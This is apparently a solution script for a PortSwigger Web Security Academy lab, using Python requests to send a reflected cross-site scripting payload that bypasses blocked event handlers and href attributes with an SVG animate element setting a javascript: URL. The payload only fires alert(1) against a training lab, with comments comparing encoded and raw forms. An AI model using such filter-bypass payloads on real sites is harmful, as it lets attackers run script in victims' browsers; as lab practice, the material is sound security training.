# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked
import requests

requests.packages.urllib3.disable_warnings()

verify = False
scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
host = "ac991fa71e799d7880d20c7500a500c0.web-security-academy.net"
path = ""
url = scheme + host + path
cookies = {"session": "FZmDoHfbNez9xd7v2NSktmZ4ypvJIAWw"}

payload = "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a><svg />"
# payload="%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E%3Csvg+%2F%3E"
params = {"search": payload}

# Url encoded payload (incorrect payload):
# Note that i do not actually run this payload with the closing svg tag, since did not realize at the time that the answer on the website was incorrect. But i am assuming that it will still not work.
# <h1>0 search results for '%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E'</h1>

# No encoding (correct payload):
# <h1>0 search results for '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a><svg />'</h1>

requests.get(url, verify=verify, params=params, cookies=cookies, proxies=proxies)
